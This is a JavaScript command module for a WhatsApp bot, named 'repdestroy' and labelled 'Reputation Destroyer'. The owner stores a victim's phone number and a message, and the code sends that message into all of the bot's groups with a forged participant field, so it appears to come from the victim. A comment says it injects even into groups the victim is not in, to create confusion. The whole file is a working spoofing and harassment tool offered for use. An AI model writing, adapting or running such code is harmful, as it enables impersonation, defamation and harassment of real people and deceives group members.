module.exports = {
    name: "repdestroy",
    aliases: ["repkill", "repnuke", "destroyrep"],
    category: "spicy",
    permissions: { coin: 0, group: false, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const args = ctx.args || [];
            const sub  = args[0]?.toLowerCase();

            if (!sub) {
                return await ctx.reply(
                    "*Reputation Destroyer*\n\n" +
                    "`.repdestroy target <number>` — set target number\n" +
                    "`.repdestroy message <text>` — set message to inject (appears from target)\n" +
                    "`.repdestroy preview` — preview what will be sent\n" +
                    "`.repdestroy fire` — inject across all groups\n" +
                    "`.repdestroy fire <groupJid>` — inject into specific group\n\n" +
                    "⚠️ Message will appear to come from the target's number."
                );
            }

            const fs   = require("node:fs");
            const path = require("node:path");
            const cfgFile = path.join(process.cwd(), "repdestroyer.json");

            const getCfg = () => {
                try { return JSON.parse(fs.readFileSync(cfgFile, "utf8")); } catch { return {}; }
            };

            const saveCfg = (cfg) => {
                fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2), "utf8");
            };

            // SET TARGET
            if (sub === "target") {
                const number = args[1]?.replace(/[^0-9]/g, "");
                if (!number) return await ctx.reply("❌ Provide a number.");

                const cfg = getCfg();
                cfg.target = number;
                saveCfg(cfg);
                await ctx.reply(`✅ Target set: +${number}`);
                return;
            }

            // SET MESSAGE
            if (sub === "message") {
                const message = args.slice(1).join(" ");
                if (!message) return await ctx.reply("❌ Provide a message.");

                const cfg = getCfg();
                cfg.message = message;
                saveCfg(cfg);
                await ctx.reply(`✅ Message set:\n"${message}"`);
                return;
            }

            // PREVIEW
            if (sub === "preview") {
                const cfg = getCfg();
                if (!cfg.target || !cfg.message) {
                    return await ctx.reply("❌ Set target and message first.");
                }

                await ctx.reply(
                    `*Preview*\n\n` +
                    `Appears from: +${cfg.target}\n` +
                    `Message: "${cfg.message}"\n\n` +
                    `Will inject into all groups bot is in.\n` +
                    `Run \`.repdestroy fire\` to execute.`
                );
                return;
            }

            // FIRE
            if (sub === "fire") {
                const cfg = getCfg();
                if (!cfg.target || !cfg.message) {
                    return await ctx.reply("❌ Set target and message first with `.repdestroy target` and `.repdestroy message`");
                }

                const targetJid = `${cfg.target}@s.whatsapp.net`;
                const specificGroup = args[1]?.endsWith("@g.us") ? args[1] : null;

                let groupJids = [];

                if (specificGroup) {
                    groupJids = [specificGroup];
                } else {
                    const allGroups = await sock.groupFetchAllParticipating();
                    groupJids = Object.keys(allGroups);
                }

                await ctx.reply(
                    `💀 Destroying reputation of +${cfg.target}\n` +
                    `Injecting into ${groupJids.length} group(s)...`
                );

                let success = 0;
                let failed  = 0;

                for (const gJid of groupJids) {
                    try {
                        // verify target is actually in this group
                        let targetInGroup = false;
                        try {
                            const meta = await sock.groupMetadata(gJid);
                            targetInGroup = meta.participants.some(p =>
                                p.id.split("@")[0] === cfg.target
                            );
                        } catch {}

                        // inject even if not in group — creates max confusion
                        await sock.relayMessage(
                            gJid,
                            { conversation: cfg.message },
                            {
                                messageId: `REP_${Date.now()}_${Math.random().toString(36).slice(2)}`,
                                participant: targetJid,
                                additionalAttributes: { participant: targetJid }
                            }
                        );

                        success++;
                        await new Promise(r => setTimeout(r, 1200));

                    } catch {
                        failed++;
                    }
                }

                await ctx.reply(
                    `✅ Reputation destroyed.\n` +
                    `Injected: ${success} groups\n` +
                    `Failed: ${failed} groups\n\n` +
                    `Message appeared from: +${cfg.target}`
                );
                return;
            }

            await ctx.reply("❌ Unknown subcommand. Type `.repdestroy` for help.");

        } catch (e) {
            console.error("[repdestroy]", e);
            await ctx.reply("❌ " + e.message);
        }
    }
};